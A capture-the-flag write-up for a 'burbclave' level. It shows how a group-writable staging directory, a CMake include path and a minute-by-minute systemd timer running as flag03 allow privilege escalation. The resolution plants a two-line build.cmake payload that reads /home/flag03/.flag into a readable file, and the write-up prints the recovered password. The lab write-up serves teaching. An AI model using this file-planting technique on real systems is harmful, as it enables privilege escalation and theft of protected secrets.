# Level03 - burbclave :

## 🔍 1. Looking for clues

Unlike the previous levels, `/opt/snowcrash/level03/` does not contain an executable binary, but a CMake script owned by **flag03** and readable by the **level03** group:

```bash
level03@snowcrash:~$ ls -la /opt/snowcrash/level03/
total 12
drwxr-xr-x  2 root   root    4096 Jun  9 19:03 .
drwxr-xr-x 18 root   root    4096 Jun  9 19:04 ..
-rw-r-----  1 flag03 level03 2327 Jun  9 19:03 CMakeLists.txt
```

Inspecting `CMakeLists.txt` reveals that it reads /etc/burbclave/burbclave.conf, parses runtime_base and workspace values, builds `${RESOLVED_BUILD_PATH}`, and includes build.cmake from that resolved path:

```CMake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)

string(REGEX MATCH "runtime_base=([^\n]+)" _ ${CONF_CONTENT})
set(RUNTIME_BASE ${CMAKE_MATCH_1})

string(REGEX MATCH "workspace=([^\n]+)" _ ${CONF_CONTENT})
set(WORKSPACE_NAME ${CMAKE_MATCH_1})

string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")

include(${RESOLVED_BUILD_PATH}/build.cmake)
```

## 🔬 2. Service, Permissions & Timer Analysis

Looking for **burbclave** paths on the system highlights `/var/lib/burbclave` along with the systemd units:

```bash
level03@snowcrash:~$ find / -name "*burbclave*" 2>/dev/null
/var/lib/burbclave
/etc/systemd/system/burbclave.timer
/etc/systemd/system/burbclave.service
/etc/systemd/system/timers.target.wants/burbclave.timer
/etc/burbclave
```

Although `/etc/burbclave/burbclave.conf` is restricted (*Permission denied*), **level03** belongs to the **burbclave group** :

```bash
level03@snowcrash:~$ id level03
uid=1004(level03) gid=1006(level03) groups=1006(level03),1001(levelgroup),988(burbclave)
```

Inspecting `/var/lib/burbclave/` confirms that both the directory and its `staging` subdirectory are group-writable by **burbclave** :

```bash
level03@snowcrash:~$ ls -laR /var/lib/burbclave/
/var/lib/burbclave/:
total 12
drwxrwxr-x  3 root burbclave 4096 Jun  9 19:03 .
drwxr-xr-x 46 root root      4096 Nov 10 16:31 ..
drwxrwxr-x  2 root burbclave 4096 Jun  9 19:03 staging
```

And `burbclave.timer` triggers `burbclave.service` periodically (*OnUnitActiveSec=60s*):

```bash
level03@snowcrash:~$ cat /etc/systemd/system/burbclave.timer
[Unit]
Description=Burbclave build runner timer — runs every minute

[Timer]
OnBootSec=30s
OnUnitActiveSec=60s
AccuracySec=1s
Unit=burbclave.service

[Install]
WantedBy=timers.target
```

## 🛠️ 3. Resolution

Because **burbclave.service** runs as **flag03** and includes `build.cmake` inside the writable `staging` directory, we can plant a malicious build.cmake file there that reads `/home/flag03/.flag` and writes its content into a pre-created writable `flag.txt` :

```CMake
file(READ "/home/flag03/.flag" FLAG_CONTENT)
file(WRITE "/var/lib/burbclave/staging/flag.txt" "#FLAG: ${FLAG_CONTENT}\n")
```

Once both files are placed, we wait up to a minute for `burbclave.timer` to trigger `burbclave.service` as **flag03**, which executes our CMake directives and writes the flag into the file.

## 🔑 4. Validation

```bash
$ su level04
Password: b209ea91ad7a5c2a0b0f4e195ca4
level04@snowcrash:~$
```

**Flag / Password :** `b209ea91ad7a5c2a0b0f4e195ca4`

### 💡 Key Takeaway:
- **Insecure permissions on included build scripts** combined with an automated privileged **systemd** timer allow arbitrary directive execution as the target user (**flag03**) when a writable build directory is included in the execution flow.


